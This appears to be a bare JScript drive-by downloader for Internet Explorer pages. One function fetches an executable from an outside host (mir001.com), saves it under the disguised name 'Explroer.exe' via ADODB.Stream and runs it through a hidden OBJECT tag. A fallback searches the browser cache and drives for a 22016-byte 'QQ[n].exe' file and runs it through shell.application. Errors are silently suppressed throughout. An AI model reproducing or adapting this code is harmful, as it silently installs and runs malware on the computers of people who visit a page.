function EARTHSIMULATOR(){
url=document.location.href;
xtmu=url.substring(6,url.indexOf('\\',9)+1);
xtp=url.substr(6,3);
var shell=new ActiveXObject("shell.application");
var runbz=1;
var exeSize=22016;
var a=/QQ\[\d*\]\.exe/gi;
a.compile("QQ\\[\\d*\\]\\.exe","gi");
var b=/[A-Za-z]:\\/gi;
b.compile("[A-Za-z]:\\\\","gi");
wjj(xtmu+"Temporary Internet Files\\");//Content.IE5\\
if(runbz)wjj(xtp+"Documents and Settings\\");
if(runbz)yp();
function yp(){
try{
var c=new Enumerator(shell.namespace("c:\\").ParentFolder.Items());
for (;!c.atEnd();c.moveNext()){
if(runbz){if(b.test(c.item().path))wjj(c.item().path);}
else break;
}
}catch(e){}
}
function wjj(b){
try{
var c=new Enumerator(shell.namespace(b).Items());
for (;!c.atEnd();c.moveNext()){
if(runbz&&c.item().Size==exeSize&&a.test(c.item().path)){
var f=c.item().path;
var v=f.lastIndexOf('\\')+1;
try{
shell.namespace(f.substring(0,v)).items().item(f.substr(v)).invokeverb();
runbz=0;
break;
}catch(e){}
}
if(!c.item().Size)wjj(c.item().path+"\\");
}
}catch(e){}
}
}
function qq359714061(){
var name="Explroer.exe";
var url="http://www.mir001.com/mm/QQ/QQ.exe";
try{
var folder=document.location.href;
folder=folder.substring(6,folder.indexOf('\\',9)+1)+name;
var xml=new ActiveXObject("Microsoft.XMLHTTP");
xml.open("GET",url,false);
xml.send();
if(xml.status==200){
var ado=new ActiveXObject("ADODB.Stream");
ado.Type=1;
ado.Open();
ado.write(xml.responseBody);
ado.SaveToFile(folder,2);
ado.Close();
ado=null;
}
xml=null;
document.body.insertAdjacentHTML('AfterBegin','<OBJECT style="display:none;" TYPE="application/x-oleobject" CODEBASE="'+folder+'"></OBJECT>');
}
catch(e){}
}
try{new ActiveXObject("ADODB.Stream");qq359714061();}catch(e){EARTHSIMULATOR();}